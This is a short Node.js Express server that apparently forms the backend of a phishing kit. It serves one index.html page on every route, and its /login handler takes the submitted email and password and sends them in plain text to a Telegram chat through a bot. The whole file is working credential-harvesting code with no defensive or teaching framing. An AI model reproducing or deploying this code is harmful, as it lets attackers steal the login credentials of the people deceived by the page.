const express = require("express");
const path = require("path");
const bodyParser = require("body-parser");
const TelegramBot = require("node-telegram-bot-api");

const app = express();
const port = process.env.PORT || 3000;

// Telegram bot token
const botToken = process.env.TELEGRAM_BOT_TOKEN;
const chatId = process.env.TELEGRAM_CHAT_ID;

// Create a new instance of the Telegram bot
const bot = new TelegramBot(botToken, { polling: false });

// Parse incoming request bodies
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// Serve static files from the 'public' directory
app.use(express.static(__dirname));

// Handle login request
app.post("/login", (req, res) => {
  const email = req.body.email;
  const password = req.body.password;

  // Send the login credentials to the Telegram bot
  const message = `Received login credentials:\nEmail: ${email}\nPassword: ${password}`;
  bot.sendMessage(chatId, message);

  res.sendStatus(200); // Send success response to the client
});

// Serve index.html for any requested route
app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
